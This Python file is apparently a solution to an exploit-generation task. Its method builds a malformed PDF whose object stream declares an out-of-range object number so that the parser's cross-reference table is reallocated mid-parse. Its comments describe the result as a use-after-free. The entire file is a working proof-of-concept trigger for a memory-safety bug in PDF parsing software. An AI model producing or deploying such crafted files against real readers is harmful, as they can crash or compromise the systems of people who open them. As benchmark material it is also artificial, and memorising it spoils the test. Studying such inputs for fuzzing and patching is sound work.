import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # PDF Header
        header = b"%PDF-1.5\n%\xE2\xE3\xCF\xD3\n"
        
        objs = []
        
        # Object 1: Catalog
        objs.append(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
        
        # Object 2: Pages
        objs.append(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
        
        # Object 3: Page
        # References Object 5 via /Rotate to force loading of the compressed object.
        # Object 5 is inside Object Stream 4.
        objs.append(b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 600 600] /Rotate 5 0 R >>\nendobj\n")
        
        # Object 4: Object Stream
        # This stream contains two objects:
        # 1. Object 1000: A dummy object with a high ID to force xref table resizing.
        # 2. Object 5: The actual object requested by the Page.
        #
        # Index format: "obj_num offset ..."
        # "1000 0" -> Object 1000 at offset 0
        # "5 10"   -> Object 5 at offset 10
        indices = b"1000 0 5 10 "
        first = len(indices)
        
        # Stream Data:
        # Offset 0: Object 1000 content "(A)" (length 3).
        # We need to pad to offset 10.
        # Padding length = 10 - 3 = 7 bytes.
        # Offset 10: Object 5 content "90" (integer).
        content = indices + b"(A)" + b" " * 7 + b"90"
        
        o4_dict = f"<< /Type /ObjStm /N 2 /First {first} /Length {len(content)} >>".encode()
        o4 = b"4 0 obj\n" + o4_dict + b"\nstream\n" + content + b"\nendstream\nendobj\n"
        objs.append(o4)
        
        # Calculate offsets
        current_offset = len(header)
        offsets = {}
        for i, obj_bytes in enumerate(objs):
            obj_id = i + 1
            offsets[obj_id] = current_offset
            current_offset += len(obj_bytes)
            
        # Object 6: XRef Stream
        offsets[6] = current_offset
        
        # Build XRef Stream Data
        # W = [1, 2, 1] (1 byte type, 2 bytes offset, 1 byte index/gen)
        # Entries for 0, 1, 2, 3, 4, 5, 6
        def pack_entry(t, f2, f3):
            return struct.pack(">B", t) + struct.pack(">H", f2) + struct.pack(">B", f3)

        xref_payload = b""
        xref_payload += pack_entry(0, 0, 0)          # 0: Free
        xref_payload += pack_entry(1, offsets[1], 0) # 1: Catalog
        xref_payload += pack_entry(1, offsets[2], 0) # 2: Pages
        xref_payload += pack_entry(1, offsets[3], 0) # 3: Page
        xref_payload += pack_entry(1, offsets[4], 0) # 4: ObjStm
        xref_payload += pack_entry(2, 4, 1)          # 5: Compressed in Stm 4, index 1
        xref_payload += pack_entry(1, offsets[6], 0) # 6: XRef Stream
        
        # /Size 7 implies objects 0..6.
        # When ObjStm 4 is parsed, it declares object 1000.
        # This forces the xref table to grow/reallocate while processing ObjStm 4.
        # If the parser holds a pointer to xref entry 4 during this, UAF occurs.
        o6_dict = f"<< /Type /XRef /Size 7 /Root 1 0 R /W [1 2 1] /Index [0 7] /Length {len(xref_payload)} >>".encode()
        o6 = b"6 0 obj\n" + o6_dict + b"\nstream\n" + xref_payload + b"\nendstream\nendobj\n"
        
        trailer = b"startxref\n" + str(offsets[6]).encode() + b"\n%%EOF\n"
        
        return header + b"".join(objs) + o6 + trailer